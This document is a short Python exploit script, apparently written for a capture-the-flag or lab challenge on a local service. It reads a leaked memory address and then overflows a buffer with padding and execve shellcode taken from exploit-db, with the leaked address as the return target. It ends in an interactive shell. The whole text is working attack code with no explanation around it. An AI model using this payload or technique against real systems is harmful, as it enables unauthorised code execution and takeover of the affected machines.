#!/usr/bin/python
p = remote('127.0.0.1', 9999)
# receive until we see this text
p.recvuntil("Oops, I'm leaking! ")
# store leaked libc base address
leak=int(p.recvuntil("\n"),16)
log.info('Libc address: {}'.format(hex(leak)))
p.recvuntil("> ")
# execve x64 shellcode 30 bytes - https://www.exploit-db.com/exploits/37362/
payload = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload += "A"*(72-len(payload))
payload += p64(leak)
p.sendline (payload)
p.interactive()
